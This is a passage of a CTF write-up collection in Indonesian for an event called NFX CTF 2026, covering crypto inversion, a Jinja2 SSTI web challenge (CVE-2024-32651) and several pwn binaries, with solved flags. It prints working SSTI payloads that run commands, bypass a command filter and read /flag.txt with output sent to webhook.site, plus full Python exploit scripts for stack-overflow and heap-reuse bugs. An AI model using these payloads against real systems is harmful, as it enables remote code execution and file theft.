# NFX CTF 2026 - FULL WRITEUPS (KoJ)

Event `UMUM/MAHASISWA_NF` + `UMUM_EXTEND_DIFFICULTY`.

---

# Part I - Event `UMUM_EXTEND_DIFFICULTY` (16 writeup solved dari 38 soal)

Event 7-10 Nov 2026, platform `ctf.nfx.my.id`, akun KoJ.

## Ringkasan

- Writeup solved + flag valid: **16** dari **38** soal event.
- Soal lain tidak dimasukkan karena belum solved atau flag belum valid.

> Format writeup: Deskripsi, TL;DR, Recon, Eksploitasi, Flag, Catatan.

## Daftar soal

| Soal | Kategori | Tingkat Kesulitan | Status | Flag |
|---|---|---|---|---|
| [The Alchemist's Sandbox](#p1-the-alchemist-s-sandbox) | Misc | Medium | SOLVED - flag valid | `NFXCTF{pyj41l_4st_4lch3my_vm_pwn_d84f216a}` |
| [ChangeTrack](#p1-changetrack) | Web | Medium | SOLVED - flag valid | `NFX{ch4ng3_d3t3ct10n_j1nj4_sst1_oob_cve_2024_32651_2026}` |
| [Gateway Under Pressure](#p1-gateway-under-pressure) | Pwn | Medium | SOLVED - flag valid | `NFX{Nyoss_Gte3wayy_Pr3ssureee0!}` |
| [Pipa Nu Kotor](#p1-pipa-nu-kotor) | Pwn | Medium | SOLVED - flag valid | `NFX{Si44aTehKuduSadarDip4lakSave3Jari1}` |
| [Starved](#p1-starved) | Pwn | Medium | SOLVED - flag valid | `NFX{st4rv3d_s3cc0mp_fd0_r3us3_r0p_m4st3r}` |
| [ECDSA Nonce Bias](#p1-ecdsa-nonce-bias) | Crypto | Hard | SOLVED - flag valid | `NXCTF{ecds4_hnp_n0nc3_b14s_8b1t_l4tt1c3_a3d2ae498097}` |
| [FlagKeepers](#p1-flagkeepers) | Crypto | Hard | SOLVED - flag valid | `NFX{gcm_f0rb1dd3n_4tt4ck_du4l_t4g_c0ll1s10n_m4st3r}` |
| [Unbreakable Delay](#p1-unbreakable-delay) | Crypto | Medium | SOLVED - flag valid | `NFX{x0r_f4ct0r1ng_4nd_f4st_vdf_byp4ss_m4k3s_1t_h4rd}` |
| [Broken Signature Scheme](#p1-broken-signature-scheme) | Crypto | Hard | SOLVED - flag valid | `NXCTF{mult1_l4y3r_l4tt1c3_r54_s1gn4tur3_hnp_8c211ad6b5a6}` |
| [RSA Coppersmith cihuy](#p1-rsa-coppersmith-cihuy) | Crypto | Medium | SOLVED - flag valid | `NFXCTF{C0pp3rsm1th_p4rt14l_k3y_3xp0sur3_9617eda9}` |
| [Static IV Offline](#p1-static-iv-offline) | Crypto | Medium | SOLVED - flag valid | `NXCTF{cbc_1v_r3u53_l34k5_k3y5tr34m_b0fbd4d35f80}` |
| [Castaway](#p1-castaway) | Reverse | Hard | SOLVED - flag valid | `NFX{c4st4w4y_0n_4n_0p4qu3_st4t3_m4ch1n3}` |
| [Hard Feistel](#p1-hard-feistel) | Reverse | Hard | SOLVED - flag valid | `NFX{f315t3l_n3tw0rk_16_r0und5_r3v3rs3d}` |
| [Hard VM Bytecode](#p1-hard-vm-bytecode) | Reverse | Hard | SOLVED - flag valid | `NFX{vm_byt3c0d3_1s_l1k3_4_puzzl3}` |
| [Medium RC4](#p1-medium-rc4) | Reverse | Medium | SOLVED - flag valid | `NFX{rc4_1s_s1mpl3_but_d34dly_1n_r3v3rs1ng}` |
| [Medium TEA](#p1-medium-tea) | Reverse | Medium | SOLVED - flag valid | `NFX{t1ny_3ncrypt10n_4lg0r1thm_32_r0und5}` |

<a id="p1-the-alchemist-s-sandbox"></a>
# NFX CTF 2026 - The Alchemist's Sandbox

* **Kategori:** Misc
* **Tingkat Kesulitan:** Medium
* **Solver:** KoJ (sesi web)
* **Event:** UMUM_EXTEND_DIFFICULTY
* **Flag:** `NFXCTF{pyj41l_4st_4lch3my_vm_pwn_d84f216a}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Illal

![Alchemist Transmutation](https://media.giphy.com/media/13HgwGsXF0aiGY/giphy.gif)

Selamat datang di Laboratorium Sang Alkemis Agung! Konon katanya, sang alkemis berhasil menciptakan formula rahasia paling berharga di dunia yang ia simpan di dalam ruang penyimpanan ajaib.

Untuk melindunginya, ia menciptakan ruang isolasi mistis yang melarang penggunaan angka biasa, mantra bertanda kutip, maupun manipulasi esensi tersembunyi. Bahkan jika Anda berhasil membocorkan rahasianya, formula tersebut masih terkunci oleh 32 mantra putaran yang rumit. Apakah Anda memiliki keahlian transmutasi tingkat tinggi untuk menembus kurungan ini dan membalikkan mantranya?

**Lampiran:**

- `chall.py` → `misc/the-alchemist-s-sandbox/chall.py` (exists)
  - URL: https://drive.google.com/file/d/1CGh-1qN056hfi5NPE6yjGDpW4BccOewB/view?usp=sharing

**Service / Target:**

- tidak ada (offline / lampiran saja)

**Berkas di workspace:** `chall.py`

---

### 2. TL;DR (Ringkasan Singkat)

Lampiran chall.py berisi sandbox eval() dan konstanta _VAULT_STATE berisi 21 word 16-bit. Langkah pertama adalah membaca skemanya: flag 42 byte di-unpack big-endian menjadi 21 word, lalu diproses 32 ronde transformasi yang menggabungkan XOR, ROL16, dan permutasi indeks (i*4)%21. Flag: `NFXCTF{pyj41l_4st_4lch3my_vm_pwn_d84f216a}`.

**Pemahaman inti:** Transformasinya reversibel dan tidak bergantung pada rahasia runtime, jadi sandbox tidak perlu ditembus sama sekali. Serangan yang benar adalah inversi penuh algoritma dari _VAULT_STATE.

---

### 3. Analisis Awal (Recon / Discovery)

Lampiran `chall.py` berisi sandbox `eval()` dan konstanta `_VAULT_STATE` berisi 21 word 16-bit. Langkah pertama adalah membaca skemanya: flag 42 byte di-unpack big-endian menjadi 21 word, lalu diproses 32 ronde transformasi yang menggabungkan XOR, ROL16, dan permutasi indeks `(i*4)%21`. Yang perlu dipahami sebelum menyentuh sandbox: setiap ronde hanya memakai operasi yang bisa dibalik dan tidak ada kunci acak, sehingga seluruh state akhir dapat dikembalikan ke state awal. Kesimpulannya, jalur serangnya bukan escape `eval()`, melainkan rekonstruksi plaintext dari konstanta yang sudah diberikan.

---

### 4. Eksploitasi / Penyelesaian

#### 7 Nov 2026 - event umum_Extend_DIFFICULTY (solver web)

Lampiran `chall.py` - sandbox `eval()` + fungsi `_encrypt_vault` dan konstanta
`_VAULT_STATE` (21 word 16-bit). 42 byte flag → `struct.unpack(">21H")` →
32 round transformasi.

**Analisis:** enkripsi bersifat **reversible** (XOR + ROL16 + rotasi indeks
`(i*4)%21`), jadi tak perlu menembus sandbox sama sekali - cukup inversi
algoritma dari `_VAULT_STATE`:

```python
for r in reversed(range(32)):
    # undo permutasi: forward w_new[i]=w_old[(i*4)%21]
    old=[0]*21
    for i in range(21): old[(i*4)%21]=w[i]
    w=old
    rc=((r*0x9E37)+0x7F4A)&0xFFFF
    for i in reversed(range(21)):
        t=(ror16(w[i],5)-rc)&0xFFFF
        prev=w[(i-1)%21]
        mix=rol16((prev*257+rc+i*17)&0xFFFF,(r+i)%15+1)
        w[i]=t^mix
flag=struct.pack(">21H",*w)
```

Hasil 42 byte printable, dan **re-enkripsi round-trip == `_VAULT_STATE`** .

**FLAG:**
```
NFXCTF{pyj41l_4st_4lch3my_vm_pwn_d84f216a}
```

---

### 5. Flag & Verifikasi

**Flag:** `NFXCTF{pyj41l_4st_4lch3my_vm_pwn_d84f216a}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p1-changetrack"></a>
# NFX CTF 2026 - ChangeTrack

* **Kategori:** Web
* **Tingkat Kesulitan:** Medium
* **Solver:** KoJ (sesi web)
* **Event:** UMUM_EXTEND_DIFFICULTY
* **Flag:** `NFX{ch4ng3_d3t3ct10n_j1nj4_sst1_oob_cve_2024_32651_2026}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Ariaf

![img](https://c.tenor.com/1EPPoQexQ4oAAAAd/tenor.gif)

**ChangeTrack** adalah platform pemantau perubahan halaman web, REST API, dan RSS perusahaan yang terinspirasi murni dari proyek open-source terkenal `changedetection.io`. Pengguna mengonfigurasi watcher dan manifes webhook notifikasi kustom dalam format YAML.

> Note: Challenge ini sedikit terinspirasi dari Columbina - karakter yang identik dengan matanya yang selalu tertutup.

**Lampiran:**

- tidak ada

**Service / Target:**

- `{"name":"NFX/ChangeTrack","key":"NFXCTF-NFCC-NXCTF-2026"}`

Cek port terkini SEBELUM eksploit (jangan hardcode):
```bash
B="https://ctf.nfx.my.id/api/nxctl"
K="X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
curl -s "$B?action=status" -H "$K"
curl -s "$B?action=inspect&name=<nama>" -H "$K"
curl -s -X POST "$B" -H "$K" -H "Content-Type: application/json" \
  -d '{"action":"extend","name":"<nama>"}' # TTL <=900 dtk
```

---

### 2. TL;DR (Ringkasan Singkat)

Service berjalan sebagai gunicorn/Flask dengan fitur watcher: tiap watcher punya target_url dan manifest YAML berisi konfigurasi notifikasi webhook_url, format, dan template. Recon awal membaca /health, yang membocorkan string ChangeTrack Engine v2.4 (CVE-2024-32651) dan langsung menunjuk ke SSTI Jinja2 di changedetection.io. Flag: `NFX{ch4ng3_d3t3ct10n_j1nj4_sst1_oob_cve_2024_32651_2026}`.

**Pemahaman inti:** Input yang dikendalikan penyerang adalah template Jinja2 di manifest, bukan parameter request. Jadi SSTI terjadi di worker notifikasi, dan output harus ditangkap lewat webhook eksternal.

---

### 3. Analisis Awal (Recon / Discovery)

Service berjalan sebagai gunicorn/Flask dengan fitur watcher: tiap watcher punya `target_url` dan manifest YAML berisi konfigurasi notifikasi `webhook_url`, `format`, dan `template`. Recon awal membaca `/health`, yang membocorkan string `ChangeTrack Engine v2.4 (CVE-2024-32651)` dan langsung menunjuk ke SSTI Jinja2 di changedetection.io. Route yang tersedia hanya `/login`, `/dashboard`, `/logout`, dan `/watchers/watch-01` beserta sub-route edit/test/delete, sementara `/admin`, `/register`, dan `/api/v1/*` semuanya 404. Login demo `admin@company.com / admin` memberi sesi dengan satu watcher. Dari struktur itu terlihat alur eksekusinya: worker membaca `template` dari manifest, merendernya, lalu mengirim hasil render ke `webhook_url`, sehingga template adalah titik injeksi dan webhook.site bisa dipakai sebagai penangkap output.

---

### 4. Eksploitasi / Penyelesaian

#### 7 Nov 2026 - event umum_Extend_DIFFICULTY (solver web)

Service: `NFX/ChangeTrack` → `http://s1.nfx.my.id:43264` (gunicorn/Flask; ttl 852s, sudah di-extend).
Artefak: `platform_tools/r5/ct/` (home.html, login.html, dash.html, jar.txt, manifest1..10.txt, test_h.txt).

**Rekon:**
1. `/health` bocorkan `"ChangeTrack Engine v2.4 (CVE-2024-32651)"` → SSTI Jinja2
   di body notifikasi changedetection.io.
2. `/admin|/register|/api/v1/*` = 404; route: `/login`, `/dashboard`, `/logout`,
   `/watchers/watch-01[/edit|/test|/delete]`.
3. Login menerima `admin@company.com / admin` → session Flask (quota 1 slot,
   watcher `watch-01` dengan manifest YAML):
   ```
   watcher: name/target_url/check_interval
   notification: webhook_url/format/template (Jinja2)
   ```
4. Arbitrer webhook target - set `webhook_url` ke `https://webhook.site/<tok>`
   (capturer publik, tanpa server sendiri).
5. `POST /watchers/watch-01/edit` (field `name`,`target_url`,`yaml_manifest`)
   + `POST /watchers/watch-01/test` → worker me-render template dan POST body
   hasil render ke webhook_url.

**SSTI (CVE-2024-32651)** - probe `{{7*7}}` → `PWN: 49`; `{{cycler.__init__.
__globals__.os.popen('id').read()}}` → `uid=0(root) gid=0(root)`.

**Gotcha penting:** worker **men-drop dispatch diam-diam** jika template
memanggil command tertentu (`ls`, `cat`, `pwd`, `ls -la /` tampak diblokir -
`echo`/`id` lolos). Bypass = **Jinja2 builtins injection tanpa shell**:
```
{{cycler.__init__.__globals__.__builtins__.__import__('os').listdir('/')}}
{{cycler.__init__.__globals__.__builtins__.__import__('glob').glob('/f*')}}
```
→ `/flag.txt` ada di root; baca:
```
{{cycler.__init__.__globals__.__builtins__.open('/flag.txt').read()}}
```

**FLAG:**
```
NFX{ch4ng3_d3t3ct10n_j1nj4_sst1_oob_cve_2024_32651_2026}
```
Bukti: request webhook.site 13:xx terakhir berisi `FLAGGET: NFX{ch4ng3_d3t3ct10n_j1nj4_sst1_oob_cve_2024_32651_2026}`.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{ch4ng3_d3t3ct10n_j1nj4_sst1_oob_cve_2024_32651_2026}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p1-gateway-under-pressure"></a>
# NFX CTF 2026 - Gateway Under Pressure

* **Kategori:** Pwn
* **Tingkat Kesulitan:** Medium
* **Solver:** KoJ (sesi pwn)
* **Event:** UMUM_EXTEND_DIFFICULTY
* **Flag:** `NFX{Nyoss_Gte3wayy_Pr3ssureee0!}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Amablex

Sebuah perusahaan menggunakan gateway untuk menangani komunikasi antara pengguna eksternal dan
infrastruktur internal. Audit menemukan bahwa salah satu komponen memiliki kelemahan saat memproses data masuk. Kamu diberikan binary simulasi komponen tersebut. Analisis bagaimana kesalahan pengelolaan memori dapat memengaruhi alur eksekusi, lalu buktikan bahwa fungsi yang tidak tersedia pada alur normal dapat dicapai.

![img](https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExMmJwNHozeGloanl5MWt5MDhlZnAwaG14bjFpdGJhZHR1Z2NsbWNzbSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/nyg2uZCOpcH144w8qv/giphy.gif)

**Lampiran:**

- `GatewayUnderPressure.zip` → `pwn/gateway-under-pressure/GatewayUnderPressure.zip` (exists)
  - URL: https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/pwn/GatewayUnderPressure.zip

**Service / Target:**

- `{"name":"NFX/PWNNXCTF-2026/GatewayUnderPressure","key":"NFXCTF-NFCC-NXCTF-2026"}`

Cek port terkini SEBELUM eksploit (jangan hardcode):
```bash
B="https://ctf.nfx.my.id/api/nxctl"
K="X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
curl -s "$B?action=status" -H "$K"
curl -s "$B?action=inspect&name=<nama>" -H "$K"
curl -s -X POST "$B" -H "$K" -H "Content-Type: application/json" \
  -d '{"action":"extend","name":"<nama>"}' # TTL <=900 dtk
```

**Berkas di workspace:** `GatewayUnderPressure.zip` · `work/`

---

### 2. TL;DR (Ringkasan Singkat)

Binary gateway bersifat PIE, NX, dan memakai canary, tetapi tidak di-strip. Ada fungsi release_gateway() di 0x12e1 yang membuka flag.txt dan mencetaknya, padahal fungsi itu tidak dipanggil oleh alur menu normal. Flag: `NFX{Nyoss_Gte3wayy_Pr3ssureee0!}`.

**Pemahaman inti:** Dua bug-nya harus dirangkai: `do_audit` memberi stack leak untuk canary dan PIE, `do_dispatch` memberi overflow ke buffer yang sama. Tanpa leak, ret2win tidak mungkin karena PIE aktif.

---

### 3. Analisis Awal (Recon / Discovery)

Binary `gateway` bersifat PIE, NX, dan memakai canary, tetapi tidak di-strip. Ada fungsi `release_gateway()` di `0x12e1` yang membuka `flag.txt` dan mencetaknya, padahal fungsi itu tidak dipanggil oleh alur menu normal. Dari disassembly, `do_audit` (menu 2) membaca angka dengan `read_line` ke buffer `rbp-0x70`, mengubahnya dengan `strtol`, lalu memanggil `write(1, rbp-0x50, n)` dengan `n` sampai `0x1000`. Artinya niat awal fungsi ini adalah mencetak isi stack, dan itu menjadi primitive leak: canary di `0x48`, saved rbp di `0x50`, return address ke main di `0x58`. `do_dispatch` (menu 3, hanya aktif setelah register) melakukan `read_exact` ke `rbp-0x50` dengan panjang sampai `0x200`, yaitu buffer yang sama, sehingga overflow-nya bisa memakai canary hasil leak.

---

### 4. Eksploitasi / Penyelesaian

#### 8 Nov - SOLVED: NFX{Nyoss_Gte3wayy_Pr3ssureee0!}

**Binari**: `work/peserta/gateway` (PIE, NX, canary, TIDAK di-strip). Win function = `release_gateway()` @0x12e1
(fopen("flag.txt") → fgets → `printf("FLAG: %s")`), tidak dipanggil alur normal.
**Primitive**:
- `do_audit` (menu 2): `read_line(buf@rbp-0x70,0x20)` → strtol n (0<n≤0x1000) → `write(1, rbp-0x50, n)` =
  **stack leak** (canary @0x48, saved rbp @0x50, RA ke main @0x58).
- `do_dispatch` (menu 3, wajib register dulu): `read_exact(rbp-0x50, n≤0x200)` = **stack BOF**
  (canary @0x48, saved rbp @0x50, ret @0x58).
**Eksploit**: register (menu 1) → audit (menu 2, n=0x100) leak canary+RA → PIE = RA-0x1807 →
dispatch (menu 3, n=0x60): `'A'*0x48 + canary + dummy + pie+0x12e1` → release_gateway cetak flag.
Catatan: n=0x1000 bikin `write` parsial/EFAULT di remote (stack top beda) → pakai 0x100.
**Bukti**: lokal `LOKALFLAG{gateway_ret2win_ok}`; remote 2× `NFX{Nyoss_Gte3wayy_Pr3ssureee0!}` (port 43140).
**Artefak**: `platform_tools/pwn-7nov/gateway_exp.py`.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{Nyoss_Gte3wayy_Pr3ssureee0!}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.

---

### 6. Catatan & Pelajaran

#### Kode solver

**`platform_tools/pwn-7nov/gateway_exp.py`**

````python
#!/usr/bin/env python3
"""Gateway Under Pressure - PWN NFX 2026 (Medium).
- do_audit(menu 2): write(1, rbp-0x50, n<=0x1000) -> leak stack (canary@0x48, RA main@0x58)
- do_dispatch(menu 3, setelah register): read_exact(rbp-0x50, n<=0x200) -> BOF (canary@0x48, ret@0x58)
- win: release_gateway() @0x12e1 -> fopen("flag.txt"), printf("FLAG: %s")
Menu: 1 register, 2 audit, 3 dispatch (butuh register), 4 exit.
"""
import socket, struct, sys, time, select, os, subprocess

p64 = lambda x: struct.pack('<Q', x & 0xffffffffffffffff)
WIN_OFF = 0x12e1
RA_AUDIT = 0x1807 # return addr do_audit -> main

def recv_some(s, timeout=2.0):
    r,_,_ = select.select([s],[],[],timeout)
    if not r: return b''
    return s.recv(65536)

def recv_exact(s, n):
    buf = b''
    while len(buf) < n:
        d = s.recv(n - len(buf))
        if not d: break
        buf += d
    return buf

def exploit(s):
    recv_some(s, 1.0) # banner+menu
    s.sendall(b'1\n'); time.sleep(0.1); recv_some(s, 0.5)
    s.sendall(b'AAAA\n'); time.sleep(0.1); recv_some(s, 0.5)
    s.sendall(b'2\n'); time.sleep(0.1); recv_some(s, 0.5)
    s.sendall(b'256\n')
    leak = b''
    end = time.time() + 4
    while len(leak) < 0x100 and time.time() < end:
        d = recv_some(s, 0.5)
        if not d: break
        leak += d
    print(f'[leak] {len(leak)} bytes')
    if len(leak) < 0x60:
        raise SystemExit('leak pendek')
    canary = struct.unpack('<Q', leak[0x48:0x50])[0]
    ra = struct.unpack('<Q', leak[0x58:0x60])[0]
    pie = ra - RA_AUDIT
    print(f'[leak] canary={canary:#x} ra={ra:#x} pie={pie:#x}')
    recv_some(s, 0.5)
    s.sendall(b'3\n'); time.sleep(0.1); recv_some(s, 0.5)
    payload = b'A'*0x48 + p64(canary) + p64(0xdeadbeef) + p64(pie + WIN_OFF)
    s.sendall(str(len(payload)).encode() + b'\n'); time.sleep(0.1); recv_some(s, 0.5)
    s.sendall(payload)
    out = b''
    end = time.time() + 6
    while time.time() < end:
        d = recv_some(s, 1.0)
        if not d: break
        out += d
    print('[out]', out[:500])
    return out

def main():
    if sys.argv[1] == 'local':
        BIN = 'challenges/pwn/gateway-under-pressure/work/peserta'
        open(os.path.join(BIN,'flag.txt'),'w').write('LOKALFLAG{gateway_ret2win_ok}\n')
        a, b = socket.socketpair()
        p = subprocess.Popen(['./gateway'], cwd=BIN, stdin=b, stdout=b, stderr=b, close_fds=True)
        b.close()
        out = exploit(a)
        p.kill()
    else:
        s = socket.create_connection((sys.argv[2], int(sys.argv[3])), timeout=10)
        s.settimeout(5)
        out = exploit(s)
    import re
    m = re.findall(rb'(?:NFX|LOKALFLAG)\{[^}]+\}', out)
    print('FLAG:', m)

if __name__ == '__main__':
    main()
````


<a id="p1-pipa-nu-kotor"></a>
# NFX CTF 2026 - Pipa Nu Kotor

* **Kategori:** Pwn
* **Tingkat Kesulitan:** Medium
* **Solver:** KoJ (sesi pwn)
* **Event:** UMUM_EXTEND_DIFFICULTY
* **Flag:** `NFX{Si44aTehKuduSadarDip4lakSave3Jari1}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Amablex

Aya hiji sistem Linux anu dipaké pikeun ngolah data ngaliwatan mékanisme pipe. Sistem éta sakuduna bisa ngajaga data sangkan henteu robah sacara teu dihaja.
Tapi, tim kaamanan manggihan yén aya bagian tina mékanisme panyimpenan data anu henteu diinisialisasi kalayan bener.
Anjeun dibéri hiji binary simulasi pikeun nalungtik masalah éta. Panggihan kumaha kaayaan data
dina mémori bisa mangaruhan hasil pamrosesan program.

![img](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExajl2bGI4b3hqeHluYXg0MXpibXNtOHV0Znk5Z2pybzY2ZWViNzI2aiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/pe5ROJKVXwADEPxRIf/giphy.gif)

**Lampiran:**

- `PipaNuKotor.zip` → `pwn/pipa-nu-kotor/PipaNuKotor.zip` (exists)
  - URL: https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/pwn/PipaNuKotor.zip

**Service / Target:**

- `{"name":"NFX/PWNNXCTF-2026/PipaNuKotor","key":"NFXCTF-NFCC-NXCTF-2026"}`

Cek port terkini SEBELUM eksploit (jangan hardcode):
```bash
B="https://ctf.nfx.my.id/api/nxctl"
K="X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
curl -s "$B?action=status" -H "$K"
curl -s "$B?action=inspect&name=<nama>" -H "$K"
curl -s -X POST "$B" -H "$K" -H "Content-Type: application/json" \
  -d '{"action":"extend","name":"<nama>"}' # TTL <=900 dtk
```

**Berkas di workspace:** `PipaNuKotor.zip` · `work/`

---

### 2. TL;DR (Ringkasan Singkat)

Binary non-PIE di 0x400000, tanpa canary, dengan menu angka: daftar, buka, tutup, tulis, baca, login, keluar. Tabel [8] pointer di 0x404120 menunjuk struct malloc(0x18) berisi {ptr@0, size@8, flags@0x10, flags2@0x14}. Flag: `NFX{Si44aTehKuduSadarDip4lakSave3Jari1}`.

**Pemahaman inti:** Bug-nya bukan overflow, tetapi field `flags2` yang tidak diinisialisasi saat mode `ro`, sehingga chunk hasil reuse membawa nilai `0x10` dari pemakaian sebelumnya dan proteksi tulis dilewati.

---

### 3. Analisis Awal (Recon / Discovery)

Binary non-PIE di `0x400000`, tanpa canary, dengan menu angka: daftar, buka, tutup, tulis, baca, login, keluar. Tabel `[8]` pointer di `0x404120` menunjuk struct `malloc(0x18)` berisi `{ptr@0, size@8, flags@0x10, flags2@0x14}`. Memahami aturan mainnya penting sebelum menyentuh bug: mode `rw` memberi buffer `malloc(0x40)`, sedangkan mode `ro` menunjuk `shadow_page@0x4040e0` dan menolak tulis bila `flags != 0 && !(flags2 & 0x10)`. `isi_shadow()` saat start membaca 8 byte pertama `flag.txt` dalam bentuk hex ke `shadow_page`, dan nilai itu dipakai sebagai password `op_login`. Temuan kuncinya ada di `op_buka`: struct mode `ro` tidak menginisialisasi `flags2@0x14`. Karena struct berukuran 24 byte dan diambil dari heap yang pernah dipakai, slot yang sama bisa membawa `flags2=0x10` dari operasi tulis sebelumnya, sehingga tulis ke `shadow_page` diizinkan.

---

### 4. Eksploitasi / Penyelesaian

#### 8 Nov - SOLVED: NFX{Si44aTehKuduSadarDip4lakSave3Jari1}

**Binari**: `work/peserta/pipa` (non-PIE @0x400000, NX, tanpa canary). Menu digit: 0 daftar, 1 buka, 2 tutup, 3 tulis, 4 baca, 5 login, 6 keluar.
**Struktur**: tabel[8] pointer @0x404120; tiap struct malloc(0x18) = {ptr@0, size@8, flags@0x10, flags2@0x14}.
- buka mode `rw` → ptr=malloc(0x40), size=0x40, flags=0; mode `ro` → ptr=**shadow_page@0x4040e0**, flags=1 (proteksi).
- `isi_shadow()` saat start: baca 8 byte pertama `flag.txt` → hex ke `shadow_page` (password login!).
- `op_login`: `strcmp(input, shadow_page)` → sukses = `cetak_flag()` (fopen flag.txt + `printf("FLAG: %s")`).
- `op_tulis`: tolak bila `flags!=0 && !(flags2&0x10)`; setelah tulis sukses `flags2|=0x10`.
- `op_baca`: tolak bila `flags!=0`.
**Bug "flags basi"**: struct mode `ro` TIDAK meng-init `flags2`@0x14 → chunk malloc(0x18) reuse dari heap slot yang pernah ditulis membawa `flags2=0x10` → tulis ke shadow_page (proteksi) BERHASIL.
**Eksploit**: buka rw → tulis (set flags2) → tutup (free data+struct) → buka ro (reuse chunk) → tulis `'A'*0x3f`
(timpa shadow_page; `ptr[size-1]=0`) → login `'A'*0x3f` → `cetak_flag` → flag.
**Bukti**: lokal `LOKALFLAG{pipa_stale_flags_ok}`; remote 2× `NFX{Si44aTehKuduSadarDip4lakSave3Jari1}` (port 45083).
**Artefak**: `platform_tools/pwn-7nov/pipa_exp.py`.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{Si44aTehKuduSadarDip4lakSave3Jari1}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.

---

### 6. Catatan & Pelajaran

#### Kode solver

**`platform_tools/pwn-7nov/pipa_exp.py`**

````python
#!/usr/bin/env python3
"""Pipa Nu Kotor - PWN NFX 2026 (Medium, non-PIE).
- shadow_page (bss 0x4040e0) = hex 8 byte pertama flag.txt (isi_shadow).
- op_login: strcmp(input, shadow_page) -> cetak_flag() (prints FLAG: ...).
- Bug "flags basi": struct shadow {ptr,size,flags} tidak init flags2 @0x14.
  Heap slot (mode rw) yang pernah ditulis -> flags2|=0x10; setelah tutup (free struct 0x18),
  buka mode ro -> malloc(0x18) reuse chunk -> flags2 stale 0x10 -> op_tulis ke shadow_page
  diizinkan -> timpa password -> login dengan password buatan.
Menu: 0 daftar, 1 buka, 2 tutup, 3 tulis, 4 baca, 5 login, 6 keluar.
"""
import socket, sys, time, select, os, subprocess, re

def rs(s, t=0.6):
    r,_,_ = select.select([s],[],[],t)
    return s.recv(65536) if r else b''

def exploit(s):
    out = b''
    out += rs(s, 1.0) # banner+menu
    s.sendall(b'0\n'); out += rs(s) # daftar
    # heap slot 0
    s.sendall(b'1\n'); out += rs(s)
    s.sendall(b'rw\n'); out += rs(s)
    # tulis -> set flags2 |= 0x10
    s.sendall(b'3\n'); out += rs(s)
    s.sendall(b'0\n'); out += rs(s)
    s.sendall(b'X\n'); out += rs(s)
    # tutup -> free data + struct
    s.sendall(b'2\n'); out += rs(s)
    s.sendall(b'0\n'); out += rs(s)
    # buka ro -> struct malloc(0x18) reuse chunk stale flags2=0x10
    s.sendall(b'1\n'); out += rs(s)
    s.sendall(b'ro\n'); out += rs(s)
    # tulis ke shadow_page (harusnya diproteksi) -> password baru
    pw = b'A'*0x3f
    s.sendall(b'3\n'); out += rs(s)
    s.sendall(b'0\n'); out += rs(s)
    s.sendall(pw + b'\n'); out += rs(s)
    # login dengan password buatan
    s.sendall(b'5\n'); out += rs(s)
    s.sendall(pw + b'\n')
    end = time.time() + 5
    while time.time() < end:
        d = rs(s, 1.0)
        if not d: break
        out += d
    print('[out]', out[-500:])
    return out

def main():
    if sys.argv[1] == 'local':
        BIN = 'challenges/pwn/pipa-nu-kotor/work/peserta'
        open(os.path.join(BIN,'flag.txt'),'w').write('LOKALFLAG{pipa_stale_flags_ok}\n')
        a, b = socket.socketpair()
        p = subprocess.Popen(['./pipa'], cwd=BIN, stdin=b, stdout=b, stderr=b, close_fds=True)
        b.close()
        out = exploit(a); p.kill()
    else:
        s = socket.create_connection((sys.argv[2], int(sys.argv[3])), timeout=10)
        s.settimeout(5)
        out = exploit(s)
    print('FLAG:', re.findall(rb'(?:NFX|LOKALFLAG)\{[^}]+\}', out))

if __name__ == '__main__':
    main()
````


<a id="p1-starved"></a>
# NFX CTF 2026 - Starved

* **Kategori:** Pwn
* **Tingkat Kesulitan:** Medium
* **Solver:** KoJ (sesi pwn)
* **Event:** UMUM_EXTEND_DIFFICULTY
* **Flag:** `NFX{st4rv3d_s3cc0mp_fd0_r3us3_r0p_m4st3r}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Kesatria Baja Ringan

![img](https://media.giphy.com/media/26tn3334mIxV698ik/giphy.gif)

**Starved** adalah layanan relay kecil yang meminta nickname sebelum menerima
request upload. Kode sapaan terlalu percaya pada input pengguna, dan jalur
upload lebih parah lagi karena memakai ukuran yang dikirim klien.

**Lampiran:**

- `Starved.zip` → `pwn/starved/Starved.zip` (exists)
  - URL: https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/pwn/Starved.zip

**Service / Target:**

- `{"name":"NFX/Starved","key":"NFXCTF-NFCC-NXCTF-2026"}`

Cek port terkini SEBELUM eksploit (jangan hardcode):
```bash
B="https://ctf.nfx.my.id/api/nxctl"
K="X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
curl -s "$B?action=status" -H "$K"
curl -s "$B?action=inspect&name=<nama>" -H "$K"
curl -s -X POST "$B" -H "$K" -H "Content-Type: application/json" \
  -d '{"action":"extend","name":"<nama>"}' # TTL <=900 dtk
```

**Berkas di workspace:** `Starved.zip` · `work/`

---

### 2. TL;DR (Ringkasan Singkat)

Binary chall bersifat PIE, Full RELRO, NX, dan memakai canary, dengan libc 2.35. Ada dua permukaan input: leaker() memakai fgets(buf, 0xa0) lalu printf(buf), yang berarti format string, dan main() membaca header 8 byte (size + magic 0xdead) lalu read(0, buf@rbp-0x1a0, size) dengan size dari client, yang berarti stack overflow. Flag: `NFX{st4rv3d_s3cc0mp_fd0_r3us3_r0p_m4st3r}`.

